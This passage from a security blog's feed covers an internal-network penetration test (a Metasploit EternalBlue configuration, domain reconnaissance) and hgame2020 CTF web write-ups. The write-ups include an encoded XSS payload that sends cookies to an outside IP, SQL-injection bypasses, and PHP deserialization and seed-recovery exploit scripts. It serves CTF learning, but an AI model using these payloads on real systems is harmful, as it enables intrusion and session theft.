&lt;figure class=&#34;highlight awk&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs awk&#34;&gt;setg Proxies socks5:&lt;span class=&#34;hljs-number&#34;&gt;10.0&lt;/span&gt;.&lt;span class=&#34;hljs-number&#34;&gt;5.100&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;8888&lt;/span&gt;					&lt;span class=&#34;hljs-regexp&#34;&gt;//&lt;/span&gt;MSF走ew的代理set ReverseAllowProxy true							&lt;span class=&#34;hljs-regexp&#34;&gt;//&lt;/span&gt;开启反向代理use exploit&lt;span class=&#34;hljs-regexp&#34;&gt;/windows/&lt;/span&gt;smb&lt;span class=&#34;hljs-regexp&#34;&gt;/ms17_010_eternalblueset payload windows/&lt;/span&gt;x64&lt;span class=&#34;hljs-regexp&#34;&gt;/meterpreter/&lt;/span&gt;bind_tcpset rhost &lt;span class=&#34;hljs-number&#34;&gt;192.168&lt;/span&gt;.&lt;span class=&#34;hljs-number&#34;&gt;183.128&lt;/span&gt;set lport &lt;span class=&#34;hljs-number&#34;&gt;4444&lt;/span&gt;set AutoRunScript post&lt;span class=&#34;hljs-regexp&#34;&gt;/windows/m&lt;/span&gt;anage&lt;span class=&#34;hljs-regexp&#34;&gt;/migrate       /&lt;/span&gt;&lt;span class=&#34;hljs-regexp&#34;&gt;/自动迁移进程run&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;成功拿下 shell&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108271535393.png&#34; alt=&#34;&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;win7权限维持&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#win7权限维持&#34;&gt;#&lt;/a&gt; Win7 权限维持&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;虽然拿到了 shell，但是在使用过程中发现这个 shell 经常掉线，只能想办法弄个稳定点的 shell&lt;/li&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;win7信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#win7信息收集&#34;&gt;#&lt;/a&gt; Win7 信息收集&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;route print&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202109071737582.png&#34; alt=&#34;&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;&lt;code&gt;net user /domain&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202109071737928.png&#34; alt=&#34;&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;&lt;code&gt;net user&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202109071745632.png&#34; alt=&#34;&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;&lt;code&gt;net view&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202109071742103.png&#34; alt=&#34;&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;ol start=&#34;5&#34;&gt;
&lt;li&gt;&lt;code&gt;ping WIN-ENS2VR5TR3N&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202109071744532.png&#34; alt=&#34;&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
</content>
        <updated>2021-09-20T15:49:36.000Z</updated>
    </entry>
    <entry>
        <id>http://blog.m1n.me/2020/02/05/hgame2020/</id>
        <title>hgame2020</title>
        <link rel="alternate" href="http://blog.m1n.me/2020/02/05/hgame2020/"/>
        <content type="html">&lt;p&gt;&lt;a href=&#34;https://hgame.vidar.club/#/challenge/list&#34;&gt;https://hgame.vidar.club/#/challenge/list&lt;/a&gt;&lt;/p&gt;
&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;
&lt;h1 id=&#34;week1&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#week1&#34;&gt;#&lt;/a&gt; week1&lt;/h1&gt;
&lt;h2 id=&#34;cosmos的博客&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cosmos的博客&#34;&gt;#&lt;/a&gt; Cosmos 的博客&lt;/h2&gt;
&lt;p&gt;刚开始拿到题目提示说 git 源码泄露，就用 githack 把源码扫了下来，但是看了半天没有什么东西，后来看了 WP 才知道直接去 git 上找历史提交记录，emmmmm&lt;/p&gt;
&lt;h2 id=&#34;接头霸王&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#接头霸王&#34;&gt;#&lt;/a&gt; 接头霸王&lt;/h2&gt;
&lt;p&gt;考察知识点&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;referer&lt;/li&gt;
&lt;li&gt;X-Forwarded-For&lt;/li&gt;
&lt;li&gt;UA&lt;/li&gt;
&lt;li&gt;请求方式&lt;/li&gt;
&lt;li&gt;最后一个也是之前没见过的时间，If-Unmodified-Since，格式 If-Unmodified-Since:Tue, 26 Jan 2064 00:00:00 GMT&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;code-world&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#code-world&#34;&gt;#&lt;/a&gt; Code World&lt;/h2&gt;
&lt;p&gt;访问发现 403，查看源代码发现提示 302 跳转，就直接访问 index.php 并且抓包改一下请求方式，然后提示令 a=10，题目又提示 a=b+c，就用 payload?a=1+9, 但是还要 url 编码一下，不然 + 会变成空格&lt;/p&gt;
&lt;h2 id=&#34;鸡尼泰玫&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#鸡尼泰玫&#34;&gt;#&lt;/a&gt; 鸡尼泰玫&lt;/h2&gt;
&lt;p&gt;提示分数要 60000 以上，抓包改一下就好了&lt;/p&gt;
&lt;h1 id=&#34;week2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#week2&#34;&gt;#&lt;/a&gt; week2&lt;/h1&gt;
&lt;h2 id=&#34;cosmos博客的后台&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cosmos博客的后台&#34;&gt;#&lt;/a&gt; Cosmos 博客的后台&lt;/h2&gt;
&lt;p&gt;访问看到登陆界面，刚开始以为是 sql 注入，弄半天不行，忘记了提示只用了 HTML 和 PHP，然后直接访问发现有？action=login.php，应该可以用 php 为协议读源码，因此拿到了 login.php 和 admin.php 的源码&lt;br&gt;
在 login.php 中发现 debug 可以读取任意变量，读取一下 username 和 password 然后 $admin_password 又是固定的，读取发现是 oe 开头的（保存一个 0e 开头的 MD5 值和原值以便不时之需 s878926199a/&lt;br&gt;
0e545993274517709034328855841020），这样就可以突破登陆，就来到了 admin.php 页面，读源码发现用 CSRF 和 file 伪协议拿到 flag，payload：file://localhost/flag&lt;/p&gt;
&lt;h2 id=&#34;cosmos的留言板-1&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cosmos的留言板-1&#34;&gt;#&lt;/a&gt; Cosmos 的留言板 - 1&lt;/h2&gt;
&lt;p&gt;用单引号闭合回显不一样，存在 sql&lt;br&gt;
 注入点，发现过滤了空格还有 select，空格可以用 /**/ 绕过，select 可以双写绕过。但是这里的 #要 url 编码成 %23，不然过不去 ，一直卡在这里，然后就是熟悉的拿 flag 环节&lt;/p&gt;
&lt;h2 id=&#34;cosmos的新语言&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cosmos的新语言&#34;&gt;#&lt;/a&gt; Cosmos 的新语言&lt;/h2&gt;
&lt;p&gt;访问 mycode 拿到源码，就是一层又一层的加密，，按照加密步骤解密就好了。由于 token 会实时刷新，这里用 py 脚本跑一下就好了&lt;/p&gt;
&lt;h2 id=&#34;cosmos的聊天室&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cosmos的聊天室&#34;&gt;#&lt;/a&gt; Cosmos 的聊天室&lt;/h2&gt;
&lt;p&gt;提示必须管理员的 token 才能拿 flag，结合题目看应该是考察 XSS 拿 cookie。然后开始测试过滤，发现过滤了 &amp;lt;，但是可以通过 HTML 实体编码绕过，构造 payload，（这里放一个拿 cookie 并且登陆的总结文章 https://blog.csdn.net/lhh134/article/details/86477305 以便日后忘记）&lt;br&gt;
然后用 payload： &lt;code&gt;&amp;lt;svg/onload=&amp;quot;&amp;amp;#x77;&amp;amp;#x69;&amp;amp;#x6e;&amp;amp;#x64;&amp;amp;#x6f;&amp;amp;#x77;&amp;amp;#x2e;&amp;amp;#x6c;&amp;amp;#x6f;&amp;amp;#x63;&amp;amp;#x61;&amp;amp;#x74;&amp;amp;#x69;&amp;amp;#x6f;&amp;amp;#x6e;&amp;amp;#x2e;&amp;amp;#x68;&amp;amp;#x72;&amp;amp;#x65;&amp;amp;#x66;&amp;amp;#x3d;&amp;amp;#x22;&amp;amp;#x68;&amp;amp;#x74;&amp;amp;#x74;&amp;amp;#x70;&amp;amp;#x3a;&amp;amp;#x2f;&amp;amp;#x2f;&amp;amp;#x34;&amp;amp;#x37;&amp;amp;#x2e;&amp;amp;#x39;&amp;amp;#x36;&amp;amp;#x2e;&amp;amp;#x32;&amp;amp;#x33;&amp;amp;#x33;&amp;amp;#x2e;&amp;amp;#x32;&amp;amp;#x31;&amp;amp;#x36;&amp;amp;#x2f;&amp;amp;#x3f;&amp;amp;#x73;&amp;amp;#x3d;&amp;amp;#x22;&amp;amp;#x2b;&amp;amp;#x64;&amp;amp;#x6f;&amp;amp;#x63;&amp;amp;#x75;&amp;amp;#x6d;&amp;amp;#x65;&amp;amp;#x6e;&amp;amp;#x74;&amp;amp;#x2e;&amp;amp;#x63;&amp;amp;#x6f;&amp;amp;#x6f;&amp;amp;#x6b;&amp;amp;#x69;&amp;amp;#x65;&amp;amp;#x3b;&amp;quot;&lt;/code&gt;  拿到了 token&lt;br&gt;
/?token=f802788a02a51f9c624bb5d91815b，访问 flag 页面，改一下 token 就拿到了 flag&lt;/p&gt;
&lt;h1 id=&#34;week3&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#week3&#34;&gt;#&lt;/a&gt; week3&lt;/h1&gt;
&lt;h2 id=&#34;序列之争-ordinal-scale&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#序列之争-ordinal-scale&#34;&gt;#&lt;/a&gt; 序列之争 - Ordinal Scale&lt;/h2&gt;
&lt;p&gt;先查看源代码发现 source.zip，拿到源码，初步看一下应该是 PHP 反序列化的题目，先看一下 game.php 发现&lt;/p&gt;
&lt;figure class=&#34;highlight php-template&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php-template&#34;&gt;&lt;span class=&#34;php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$game&lt;/span&gt;-&amp;gt;rank-&amp;gt;Get() === &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;)&amp;#123;&lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;xml&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;xml&#34;&gt;        &lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;h2&lt;/span&gt;&amp;gt;&lt;/span&gt;hgame&amp;#123;flag_is_here&amp;#125;&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;/&lt;span class=&#34;hljs-name&#34;&gt;h2&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;xml&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt; &amp;#125;&lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;于是找一下 game 类，其中 rank 在__construct 方法中，新建的 Rank 类，而 Rank 类中的 rank 由__construct 方法创建，来自 session 或者直接随机，也就是说可以让 rank=1，但是发现有__destruct 方法来判断 Rank 类是不是服务器定义的，但是这里可以利用 construct 函数定义this-&gt;key = &amp;this-&amp;gt;severKey 来绕过，接下来就是找反序列化的点，发现在 Monster 类中存在反序列化的点，但是是通过 cookie 的方式传入的，也就是说我们要想办法构造符合的 cookie 来将 payload 传入，这里就需要知道 encryptKey 是多少，而 encryptKey 是由参数传入的：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$data&lt;/span&gt; = [&lt;span class=&#34;hljs-variable&#34;&gt;$playerName&lt;/span&gt;, &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;encryptKey];&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;init&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$data&lt;/span&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;foreach&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$data&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$key&lt;/span&gt; =&amp;gt; &lt;span class=&#34;hljs-variable&#34;&gt;$value&lt;/span&gt;)&amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;welcomeMsg = sprintf(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;welcomeMsg, &lt;span class=&#34;hljs-variable&#34;&gt;$value&lt;/span&gt;);&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;sign .= md5(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;sign . &lt;span class=&#34;hljs-variable&#34;&gt;$value&lt;/span&gt;);&lt;br&gt;        &amp;#125;&lt;br&gt;    &amp;#125;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;其中 foreach 用法：&lt;br&gt;
&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/hgame2020/1.png&#34; alt=&#34;1&#34; class=&#34;lazyload&#34;&gt;&lt;br&gt;
 以及 sprintf 用法：&lt;br&gt;
&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/hgame2020/2.png&#34; alt=&#34;2&#34; class=&#34;lazyload&#34;&gt;&lt;br&gt;
 也就是说我们可以通过将 playername 赋值为 % s 就可以循环的将第二个值输出，拿到 encryptKey。&lt;br&gt;
exp：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;Rank&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-class&#34;&gt;&lt;/span&gt;&amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$rank&lt;/span&gt; = &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$serverKey&lt;/span&gt;;     &lt;span class=&#34;hljs-comment&#34;&gt;// 服务器的 Key&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$key&lt;/span&gt;;&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;__construct&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;key = &amp;amp;&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;serverKey;&lt;br&gt;    &amp;#125;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$a&lt;/span&gt; = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; Rank();&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$encryptKey&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL&amp;quot;&lt;/span&gt;;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$playername&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;%s&amp;quot;&lt;/span&gt;;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$data&lt;/span&gt; = [&lt;span class=&#34;hljs-variable&#34;&gt;$playername&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$encryptKey&lt;/span&gt;];&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$sign&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;foreach&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$data&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$key&lt;/span&gt; =&amp;gt; &lt;span class=&#34;hljs-variable&#34;&gt;$value&lt;/span&gt;)&amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-variable&#34;&gt;$sign&lt;/span&gt; .= md5(&lt;span class=&#34;hljs-variable&#34;&gt;$sign&lt;/span&gt; . &lt;span class=&#34;hljs-variable&#34;&gt;$value&lt;/span&gt;);&lt;br&gt;&amp;#125;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$sign&lt;/span&gt; = md5(serialize(&lt;span class=&#34;hljs-variable&#34;&gt;$a&lt;/span&gt;) . &lt;span class=&#34;hljs-variable&#34;&gt;$sign&lt;/span&gt;);&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$sign&lt;/span&gt; = base64_encode(serialize(&lt;span class=&#34;hljs-variable&#34;&gt;$a&lt;/span&gt;) . &lt;span class=&#34;hljs-variable&#34;&gt;$sign&lt;/span&gt;);&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$sign&lt;/span&gt;;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;改一下 cookie 就拿到了 flag&lt;/p&gt;
&lt;h2 id=&#34;二发入魂&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#二发入魂&#34;&gt;#&lt;/a&gt; 二发入魂&lt;/h2&gt;
&lt;p&gt;打开题目一脸懵逼，不知道在干什么，也不知道要干什么，看了 WP 才知道好像是要通过生成的随机数来还原 seed，难怪图片说赶快交出种子。。有两种方法可以拿到 seed，一种是通过得知&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;从 mt_rand () 获取 2 个值：R000 以及 R227，中间间隔 226 个值；此外还需知道 R000 之前已生成的值的个数（用 i 表示）；&lt;/li&gt;
&lt;li&gt;根据这些值算出加扰状态值；&lt;/li&gt;
&lt;li&gt;异或这些状态值，推测出原始的状态值（s228）；&lt;/li&gt;
&lt;li&gt;根据 s228，推测出 s0，获取种子。&lt;br&gt;
&lt;a href=&#34;https://www.anquanke.com/post/id/196831&#34;&gt;https://www.anquanke.com/post/id/196831&lt;/a&gt;&lt;br&gt;
 还有一种是通过 php 的 php_mt_seed 函数直接爆破 seed&lt;br&gt;
&lt;a href=&#34;https://www.freebuf.com/vuls/192012.html&#34;&gt;https://www.freebuf.com/vuls/192012.html&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;放一个网上的 exp：&lt;/p&gt;
&lt;figure class=&#34;highlight stylus&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs stylus&#34;&gt;import requests&lt;br&gt;import os&lt;br&gt;s = requests&lt;span class=&#34;hljs-selector-class&#34;&gt;.session&lt;/span&gt;()&lt;br&gt;url = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;https://twoshot.hgame.n3ko.co/random.php?times=228&amp;quot;&lt;/span&gt;&lt;br&gt;cookie = &amp;#123;&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;PHPSESSID&amp;#x27;&lt;/span&gt;:&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;lf08on0tsqpggqqvulpsg278h1&amp;#x27;&lt;/span&gt;&amp;#125;&lt;br&gt;c = s&lt;span class=&#34;hljs-selector-class&#34;&gt;.get&lt;/span&gt;(url,cookies = cookie)&lt;br&gt;ans = str(c.text)&lt;br&gt;ans = eval(ans)&lt;br&gt;R0 = ans&lt;span class=&#34;hljs-selector-attr&#34;&gt;[0]&lt;/span&gt;&lt;br&gt;R227 = ans&lt;span 